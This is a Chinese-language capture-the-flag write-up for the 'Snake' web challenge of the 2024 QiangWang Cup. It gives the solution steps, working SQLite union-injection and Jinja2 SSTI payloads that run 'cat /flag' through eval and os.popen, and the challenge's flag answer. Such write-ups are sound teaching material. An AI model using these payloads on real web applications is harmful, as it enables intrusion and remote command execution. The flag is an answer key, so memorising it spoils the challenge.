# Snake

> 分类：Web

## 题目描述

贪吃蛇游戏，自动化通关后跳转 `/snake_win?username=`，username 处存在 SQLite 注入（union 联合查询），且查询结果用 Jinja2 模板渲染，可进一步 SSTI 执行命令。

## 考察知识点

- 贪吃蛇自动化脚本（BFS 寻路）
- SQLite SQL 注入（union select）
- Jinja2 SSTI

## 解法

1. 写 BFS 寻路脚本自动玩贪吃蛇到 50 分，`status=="win"` 时跳转 `/snake_win?username=`。
2. `username` 存在 SQL 注入，union 联合查询，第三个字段是模板回显点：

```
/snake_win?username=aaa' union select 1,2,'{{7*7}}' --
```

3. 用 SSTI payload 执行命令读 flag：

```
/snake_win?username=aaa' union select "{{7*7}}","{{7*8}}","{{x.__init__.__globals__['__builtins__']['eval']('__import__(\'os\').popen(\'cat /flag\').read()')}}"--%20
```

## 参考答案

`flag{aafe90b4-d264-4b14-ab30-2add42ccc53b}`

## 来源

- 作者：H@yn3$ | https://blog.hayneschen.top/CTF/2024-第八届强网杯.html
- 作者：yemaster | https://blog.yemaster.cn/post/123
- 作者：星盟安全团队 | https://blog.xmcve.com/2024/11/04/强网杯2024-Writeup/
- 作者：or4nge | https://cn-sec.com/archives/3364589.html
- 作者：狼组安全团队 | https://cn-sec.com/archives/3354853.html
